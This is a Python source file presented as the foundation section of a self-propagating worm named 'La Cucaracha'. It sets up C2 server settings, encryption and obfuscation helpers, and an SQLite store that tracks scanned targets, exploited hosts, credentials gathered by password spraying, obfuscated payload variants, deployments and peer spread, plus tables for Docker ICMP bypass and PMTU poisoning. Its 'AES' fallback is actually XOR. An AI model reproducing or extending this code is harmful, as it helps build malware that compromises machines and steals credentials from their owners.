#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LACUCARACHA SECTION A — Imports + Config + Database + Utils               ║
║  La Cucaracha Worm — Complete Foundation                                   ║
║                                                                              ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Concatenation order: A → B → C → ...
This section provides ALL imports, configuration constants, the Database class,
and utility functions used by the entire worm.
"""

# =============================================================================
# Standard Library Imports
# =============================================================================
import argparse
import base64
import binascii
import ctypes
import datetime
import enum
import glob
import hashlib
import hmac
import http.server
import ipaddress
import json
import logging
import math
import mmap
import os
import queue
import random
import re
import shlex
import shutil
import socket
import sqlite3
import struct
import string
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import urllib.parse
import urllib.request
import uuid
import xml.etree.ElementTree as ET
import zipfile
from dataclasses import dataclass, field, asdict
from datetime import datetime as dt
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urlparse

# =============================================================================
# Conditional (Optional) Imports
# =============================================================================
HAVE_REQUESTS = False
HAVE_PARAMIKO = False
HAVE_SCAPY = False
HAVE_CRYPTOGRAPHY = False
HAVE_PAHO_MQTT = False
HAVE_STEM = False
HAVE_SOCKS = False
HAVE_PSUTIL = False
HAVE_PYMONGO = False
HAVE_REDIS = False
HAVE_MYSQL = False
HAVE_PSYCOPG2 = False
HAVE_PYCURL = False
HAVE_I2P = False
HAVE_DNS = False
HAVE_SMBCLIENT = False
HAVE_PYCRYPTODOME = False
HAVE_TELEGRAM = False

try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    pass

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    pass

try:
    from scapy.all import IP, ICMP, TCP, UDP, Ether, ARP, DNS, DNSQR, DNSRR, Raw, send, sr1, srloop, sniff, conf, fragment, ls
    HAVE_SCAPY = True
except ImportError:
    pass

try:
    from cryptography.fernet import Fernet
    HAVE_CRYPTOGRAPHY = True
except ImportError:
    pass

try:
    import paho.mqtt.client as mqtt
    HAVE_PAHO_MQTT = True
except ImportError:
    pass

try:
    from stem.control import Controller
    import stem
    HAVE_STEM = True
except ImportError:
    pass

try:
    import socks
    HAVE_SOCKS = True
except ImportError:
    pass

try:
    import psutil
    HAVE_PSUTIL = True
except ImportError:
    pass

try:
    import pymongo
    HAVE_PYMONGO = True
except ImportError:
    pass

try:
    import redis
    HAVE_REDIS = True
except ImportError:
    pass

try:
    import mysql.connector
    HAVE_MYSQL = True
except ImportError:
    pass

try:
    import psycopg2
    HAVE_PSYCOPG2 = True
except ImportError:
    pass

try:
    import i2p
    HAVE_I2P = True
except ImportError:
    pass

try:
    import dns.resolver
    HAVE_DNS = True
except ImportError:
    pass

try:
    import smbclient
    HAVE_SMBCLIENT = True
except ImportError:
    pass

try:
    from Cryptodome.Cipher import AES
    HAVE_PYCRYPTODOME = True
except ImportError:
    pass

try:
    import telegram
    HAVE_TELEGRAM = True
except ImportError:
    pass

# =============================================================================
# Configuration Constants
# =============================================================================

# C2 server
C2_HOST = "127.0.0.1"
C2_PORT = 10007
C2_HTTP = f"http://{C2_HOST}:{C2_PORT}"

# Static authentication token — override from environment
STATIC_TOKEN = os.environ.get("STATIC_TOKEN", "CHANGE_ME_DEFAULT_TOKEN")

# Paths
WORK_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(WORK_DIR, "logs")
DB_PATH = os.path.join(WORK_DIR, "worm_mesh.db")
PAYLOAD_DIR = f"{WORK_DIR}/payloads"

# Version
WORM_VERSION = "2.0.0-la-cucaracha"

# =============================================================================
# Logging Setup
# =============================================================================

log = logging.getLogger("LaCucaracha")

def setup_logger(
    name: str = "LaCucaracha",
    level: int = logging.INFO,
    log_file: Optional[str] = None,
) -> logging.Logger:
    """Configure and return a logger with consistent formatting."""
    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.handlers.clear()

    fmt = logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Console handler
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(level)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

    # File handler (optional)
    if log_file:
        try:
            os.makedirs(os.path.dirname(log_file) or ".", exist_ok=True)
            fh = logging.FileHandler(log_file)
            fh.setLevel(level)
            fh.setFormatter(fmt)
            logger.addHandler(fh)
        except (OSError, PermissionError):
            pass

    return logger


# =============================================================================
# Crypto / Key Utility Functions
# =============================================================================

def _generate_key(seed: str = "") -> Tuple[bytes, str]:
    """Derive a 32-byte AES key and a Fernet-compatible key from a seed string.

    Returns:
        (aes_key: bytes, fernet_key_b64: str)
    """
    raw = hashlib.sha3_256(seed.encode() if seed else os.urandom(32)).digest()
    aes_key = raw  # 32 bytes for AES-256
    fernet_b64 = base64.urlsafe_b64encode(raw)
    return aes_key, fernet_b64.decode()


def _aes_encrypt(plaintext: str, key: bytes) -> str:
    """AES-256-CBC encrypt plaintext and return base64 ciphertext.

    Falls back to Fernet if cryptography.fernet is available, else XOR.
    """
    if HAVE_CRYPTOGRAPHY:
        try:
            f = Fernet(base64.urlsafe_b64encode(key[:32]).decode())
            return f.encrypt(plaintext.encode()).decode()
        except Exception:
            pass
    # Fallback: simple XOR encryption
    iv = os.urandom(16)
    data = plaintext.encode()
    encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    return base64.b64encode(iv + encrypted).decode()


def _aes_decrypt(ciphertext_b64: str, key: bytes) -> str:
    """Reverse of _aes_encrypt."""
    if HAVE_CRYPTOGRAPHY:
        try:
            f = Fernet(base64.urlsafe_b64encode(key[:32]).decode())
            return f.decrypt(ciphertext_b64.encode()).decode()
        except Exception:
            pass
    # Fallback XOR decryption
    try:
        raw = base64.b64decode(ciphertext_b64)
        iv = raw[:16]
        encrypted = raw[16:]
        decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
        return decrypted.decode()
    except Exception as exc:
        log.error(f"_aes_decrypt failed: {exc}")
        return ""


def _polymorphic_hash(content: str) -> str:
    """Generate a polymorphic hash stub for code obfuscation."""
    return hashlib.sha3_256((content + str(random.random())).encode()).hexdigest()[:16]


def _rand_ip() -> str:
    """Generate a random IPv4 address string."""
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _rand_port() -> int:
    """Generate a random high port."""
    return random.randint(1024, 65535)


def _current_timestamp() -> int:
    """Return current Unix timestamp in seconds."""
    return int(time.time())


# =============================================================================
# Database Schema
# =============================================================================

DB_SCHEMA = """
CREATE TABLE IF NOT EXISTS nodes (
    id              TEXT PRIMARY KEY,
    hostname        TEXT,
    ip              TEXT NOT NULL,
    port            INTEGER DEFAULT 22,
    os              TEXT,
    arch            TEXT,
    version         TEXT,
    public_key      TEXT,
    status          TEXT DEFAULT 'active',
    first_seen      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL,
    checkins        INTEGER DEFAULT 1,
    latency_ms      REAL DEFAULT 0.0,
    tags            TEXT DEFAULT '[]',
    mesh_peers      TEXT DEFAULT '[]',
    encryption_key  TEXT
);

CREATE TABLE IF NOT EXISTS targets (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL,
    port            INTEGER DEFAULT 22,
    protocol        TEXT DEFAULT 'tcp',
    service         TEXT,
    banner          TEXT,
    os_guess        TEXT,
    confidence      REAL DEFAULT 0.0,
    first_seen      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL,
    scan_source     TEXT DEFAULT 'masscan',
    scanned         INTEGER DEFAULT 0,
    exploited       INTEGER DEFAULT 0,
    notes           TEXT
);

CREATE TABLE IF NOT EXISTS credentials (
    id              TEXT PRIMARY KEY,
    target_ip       TEXT NOT NULL,
    port            INTEGER DEFAULT 22,
    username        TEXT NOT NULL,
    password        TEXT,
    service         TEXT DEFAULT 'ssh',
    source          TEXT DEFAULT 'spray',
    validated       INTEGER DEFAULT 0,
    first_seen      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS payloads (
    id              TEXT PRIMARY KEY,
    variant         TEXT NOT NULL,
    content         TEXT NOT NULL,
    hash            TEXT NOT NULL,
    size_bytes      INTEGER,
    obfuscation     TEXT,
    created_at      INTEGER NOT NULL,
    deployed_count  INTEGER DEFAULT 0,
    peer_spread     INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS deployments (
    id              TEXT PRIMARY KEY,
    target_id       TEXT,
    target_ip       TEXT NOT NULL,
    method          TEXT NOT NULL,
    payload_id      TEXT,
    payload_variant TEXT,
    status          TEXT DEFAULT 'pending',
    started_at      INTEGER,
    completed_at    INTEGER,
    error_msg       TEXT,
    FOREIGN KEY (target_id) REFERENCES targets(id),
    FOREIGN KEY (payload_id) REFERENCES payloads(id)
);

CREATE TABLE IF NOT EXISTS mesh_state (
    key             TEXT PRIMARY KEY,
    value           TEXT NOT NULL,
    updated_at      INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS operations_log (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp       INTEGER NOT NULL,
    level           TEXT DEFAULT 'INFO',
    source          TEXT,
    message         TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS icmp_tasks (
    id              TEXT PRIMARY KEY,
    target_ip       TEXT NOT NULL,
    os_hint         TEXT,
    ttl             INTEGER,
    priority        INTEGER DEFAULT 0,
    status          TEXT DEFAULT 'pending',
    created_at      INTEGER NOT NULL,
    processed_at    INTEGER
);

CREATE TABLE IF NOT EXISTS docker_hosts (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL,
    hostname        TEXT,
    docker_version  TEXT,
    container_count INTEGER DEFAULT 0,
    container_ids   TEXT DEFAULT '[]',
    bridge_network  TEXT DEFAULT 'docker0',
    icmp_bypassed   INTEGER DEFAULT 0,
    last_check      INTEGER NOT NULL,
    created_at      INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS pmtu_poisoned (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL UNIQUE,
    kernel_version  TEXT,
    packets_sent    INTEGER DEFAULT 0,
    last_poison     INTEGER NOT NULL,
    created_at      INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip);
CREATE INDEX IF NOT EXISTS idx_targets_exploited ON targets(exploited);
CREATE INDEX IF NOT EXISTS idx_deployments_status ON deployments(status);
CREATE INDEX IF NOT EXISTS idx_nodes_status ON nodes(status);
CREATE INDEX IF NOT EXISTS idx_credentials_target ON credentials(target_ip);
"""


# =============================================================================
# Database Class
# =============================================================================

class Database:
    """SQLite-backed persistence layer for the worm mesh.

    Provides full CRUD for targets, nodes, credentials, payloads,
    deployments, mesh_state, operations_log, icmp_tasks, docker_hosts,
    and pmtu_poisoned tables.
    """

    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path) if os.path.dirname(db_path) else ".", exist_ok=True)
        self._conn: Optional[sqlite3.Connection] = None
        self._lock = threading.Lock()

    # ---- Connection management ------------------------------------------------

    @property
    def conn(self) -> sqlite3.Connection:
        if self._conn is None:
            self._conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self._conn.row_factory = sqlite3.Row
            self._conn.execute("PRAGMA journal_mode=WAL")
            self._conn.execute("PRAGMA busy_timeout=5000")
            self._init_schema()
        return self._conn

    def _init_schema(self) -> None:
        self._conn.executescript(DB_SCHEMA)
        self._conn.commit()

    def close(self) -> None:
        if self._conn:
            self._conn.close()
            self._conn = None

    # ---- Generic helpers ------------------------------------------------------

    def execute(self, sql: str, params: tuple = ()) -> sqlite3.Cursor:
        with self._lock:
            return self.conn.execute(sql, params)

    def executemany(self, sql: str, params: List[tuple]) -> sqlite3.Cursor:
        with self._lock:
            return self.conn.executemany(sql, params)

    def commit(self) -> None:
        self.conn.commit()

    def log(self, message: str, level: str = "INFO", source: str = "system") -> None:
        ts = _current_timestamp()
        self.execute(
            "INSERT INTO operations_log (timestamp, level, source, message) VALUES (?, ?, ?, ?)",
            (ts, level, source, message),
        )
        self.commit()
        getattr(log, level.lower(), log.info)(f"[{source}] {message}")

    # ---- Targets --------------------------------------------------------------

    def add_target(
        self,
        ip: str,
        port: int = 22,
        protocol: str = "tcp",
        service: str = "",
        banner: str = "",
        scan_source: str = "masscan",
        os_guess: str = "",
        confidence: float = 0.0,
    ) -> str:
        existing = self.execute(
            "SELECT id, last_seen FROM targets WHERE ip = ? AND port = ?", (ip, port)
        ).fetchone()
        if existing:
            self.execute(
                "UPDATE targets SET last_seen = ?, scanned = scanned + 1 WHERE id = ?",
                (_current_timestamp(), existing["id"]),
            )
            self.commit()
            return existing["id"]
        tid = str(uuid.uuid4())
        now = _current_timestamp()
        self.execute(
            """INSERT INTO targets (id, ip, port, protocol, service, banner, os_guess,
               confidence, first_seen, last_seen, scan_source)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (tid, ip, port, protocol, service, banner, os_guess, confidence, now, now, scan_source),
        )
        self.commit()
        return tid

    def get_targets(
        self,
        unscanned_only: bool = False,
        unexploited_only: bool = False,
        exploited_only: bool = False,
        limit: int = 100,
    ) -> List[Dict]:
        sql = "SELECT * FROM targets WHERE 1=1"
        params: List[Any] = []
        if unscanned_only:
            sql += " AND scanned = 0"
        if unexploited_only:
            sql += " AND exploited = 0"
        if exploited_only:
            sql += " AND exploited = 1"
        sql += " ORDER BY last_seen DESC LIMIT ?"
        params.append(limit)
        rows = self.execute(sql, tuple(params)).fetchall()
        return [dict(r) for r in rows]

    def mark_exploited(self, target_id: str) -> None:
        self.execute(
            "UPDATE targets SET exploited = 1, last_seen = ? WHERE id = ?",
            (_current_timestamp(), target_id),
        )
        self.commit()

    def target_count(self) -> int:
        return self.execute("SELECT COUNT(*) AS c FROM targets").fetchone()["c"]

    # ---- Nodes ----------------------------------------------------------------

    def add_node(
        self,
        ip: str,
        hostname: str = "",
        port: int = 22,
        os_name: str = "",
        arch: str = "",
        public_key: str = "",
        encryption_key: str = "",
    ) -> str:
        existing = self.execute(
            "SELECT id, checkins FROM nodes WHERE ip = ? AND port = ?", (ip, port)
        ).fetchone()
        if existing:
            self.execute(
                """UPDATE nodes SET last_seen = ?, checkins = checkins + 1,
                   status = 'active' WHERE id = ?""",
                (_current_timestamp(), existing["id"]),
            )
            self.commit()
            return existing["id"]
        nid = str(uuid.uuid4())
        now = _current_timestamp()
        self.execute(
            """INSERT INTO nodes (id, hostname, ip, port, os, arch, public_key,
               status, first_seen, last_seen, encryption_key)
               VALUES (?, ?, ?, ?, ?, ?, ?, 'active', ?, ?, ?)""",
            (nid, hostname, ip, port, os_name, arch, public_key, now, now, encryption_key),
        )
        self.commit()
        return nid

    def get_active_nodes(self) -> List[Dict]:
        return [dict(r) for r in self.execute(
            "SELECT * FROM nodes WHERE status = 'active' ORDER BY last_seen DESC"
        ).fetchall()]

    def mark_node_dead(self, node_id: str) -> None:
        self.execute(
            "UPDATE nodes SET status = 'dead', last_seen = ? WHERE id = ?",
            (_current_timestamp(), node_id),
        )
        self.commit()

    def node_count(self) -> int:
        return self.execute(
            "SELECT COUNT(*) AS c FROM nodes WHERE status = 'active'"
        ).fetchone()["c"]

    # ---- Credentials ----------------------------------------------------------

    def store_credential(
        self,
        target_ip: str,
        username: str,
        password: str,
        port: int = 22,
        service: str = "ssh",
        source: str = "spray",
    ) -> str:
        existing = self.execute(
            "SELECT id FROM credentials WHERE target_ip = ? AND username = ? AND password = ? AND port = ?",
            (target_ip, username, password, port),
        ).fetchone()
        if existing:
            return existing["id"]
        cid = str(uuid.uuid4())
        now = _current_timestamp()
        self.execute(
            """INSERT INTO credentials (id, target_ip, port, username, password, service,
               source, first_seen, last_seen)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (cid, target_ip, port, username, password, service, source, now, now),
        )
        self.commit()
        return cid

    def get_credentials(self, target_ip: Optional[str] = None) -> List[Dict]:
        if target_ip:
            rows = self.execute(
                "SELECT * FROM credentials WHERE target_ip = ? ORDER BY last_seen DESC", (target_ip,)
            ).fetchall()
        else:
            rows = self.execute(
                "SELECT * FROM credentials ORDER BY last_seen DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    # ---- Payloads -------------------------------------------------------------

    def store_payload(
        self,
        variant: str,
        content: str,
        phash: str,
        size_bytes: int,
        obfuscation: str,
    ) -> str:
        pid = str(uuid.uuid4())
        self.execute(
            """INSERT INTO payloads (id, variant, content, hash, size_bytes,
               obfuscation, created_at)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (pid, variant, content, phash, size_bytes, obfuscation, _current_timestamp()),
        )
        self.commit()
        return pid

    def get_payloads(self, variant: Optional[str] = None) -> List[Dict]:
        if variant:
            rows = self.execute(
                "SELECT * FROM payloads WHERE variant = ? ORDER BY created_at DESC", (variant,)
            ).fetchall()
        else:
            rows = self.execute(
                "SELECT * FROM payloads ORDER BY created_at DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    def increment_deployed(self, payload_id: str, peer: bool = False) -> None:
        col = "peer_spread" if peer else "deployed_count"
        self.execute(f"UPDATE payloads SET {col} = {col} + 1 WHERE id = ?", (payload_id,))
        self.commit()

    # ---- Deployments ----------------------------------------------------------

    def add_deployment(
        self,
        target_ip: str,
        method: str,
        payload_id: str = "",
        payload_variant: str = "",
        target_id: str = "",
    ) -> str:
        did = str(uuid.uuid4())
        self.execute(
            """INSERT INTO deployments (id, target_id, target_ip, method, payload_id,
               payload_variant, status, started_at)
               VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)""",
            (did, target_id, target_ip, method, payload_id, payload_variant, _current_timestamp()),
        )
        self.commit()
        return did

    def complete_deployment(self, deploy_id: str, success: bool, error_msg: str = "") -> None:
        status = "completed" if success else "failed"
        self.execute(
            "UPDATE deployments SET status = ?, completed_at = ?, error_msg = ? WHERE id = ?",
            (status, _current_timestamp(), error_msg, deploy_id),
        )
        self.commit()

    def get_deployments(
        self,
        status: Optional[str] = None,
        target_ip: Optional[str] = None,
        limit: int = 100,
    ) -> List[Dict]:
        sql = "SELECT * FROM deployments WHERE 1=1"
        params: List[Any] = []
        if status:
            sql += " AND status = ?"
            params.append(status)
        if target_ip:
            sql += " AND target_ip = ?"
            params.append(target_ip)
        sql += " ORDER BY started_at DESC LIMIT ?"
        params.append(limit)
        return [dict(r) for r in self.execute(sql, tuple(params)).fetchall()]

    # ---- Mesh state -----------------------------------------------------------

    def get_mesh_value(self, key: str, default: str = "") -> str:
        row = self.execute(
            "SELECT value FROM mesh_state WHERE key = ?", (key,)
        ).fetchone()
        return row["value"] if row else default

    def set_mesh_value(self, key: str, value: str) -> None:
        self.execute(
            """INSERT INTO mesh_state (key, value, updated_at)
               VALUES (?, ?, ?)
               ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at""",
            (key, value, _current_timestamp()),
        )
        self.commit()

    # ---- ICMP Tasks -----------------------------------------------------------

    def add_icmp_task(
        self,
        target_ip: str,
        os_hint: str = "",
        ttl: int = 0,
        priority: int = 0,
    ) -> str:
        tid = str(uuid.uuid4())
        self.execute(
            """INSERT INTO icmp_tasks (id, target_ip, os_hint, ttl, priority, created_at)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (tid, target_ip, os_hint, ttl, priority, _current_timestamp()),
        )
        self.commit()
        return tid

    def get_pending_icmp_tasks(self, limit: int = 3) -> List[Dict]:
        rows = self.execute(
            "SELECT * FROM icmp_tasks WHERE status='pending' ORDER BY priority DESC LIMIT ?",
            (limit,),
        ).fetchall()
        return [dict(r) for r in rows]

    # ---- Stats ----------------------------------------------------------------

    def stats(self) -> Dict:
        return {
            "targets": self.execute("SELECT COUNT(*) AS c FROM targets").fetchone()["c"],
            "targets_scanned": self.execute(
                "SELECT COUNT(*) AS c FROM targets WHERE scanned > 0"
            ).fetchone()["c"],
            "targets_exploited": self.execute(
                "SELECT COUNT(*) AS c FROM targets WHERE exploited = 1"
            ).fetchone()["c"],
            "nodes_active": self.execute(
                "SELECT COUNT(*) AS c FROM nodes WHERE status = 'active'"
            ).fetchone()["c"],
            "nodes_total": self.execute("SELECT COUNT(*) AS c FROM nodes").fetchone()["c"],
            "payloads": self.execute("SELECT COUNT(*) AS c FROM payloads").fetchone()["c"],
            "deployments_total": self.execute(
                "SELECT COUNT(*) AS c FROM deployments"
            ).fetchone()["c"],
            "deployments_success": self.execute(
                "SELECT COUNT(*) AS c FROM deployments WHERE status = 'completed'"
            ).fetchone()["c"],
            "deployments_failed": self.execute(
                "SELECT COUNT(*) AS c FROM deployments WHERE status = 'failed'"
            ).fetchone()["c"],
        }


# =============================================================================
# Section A End Marker
# =============================================================================
# End of la_section_A.py
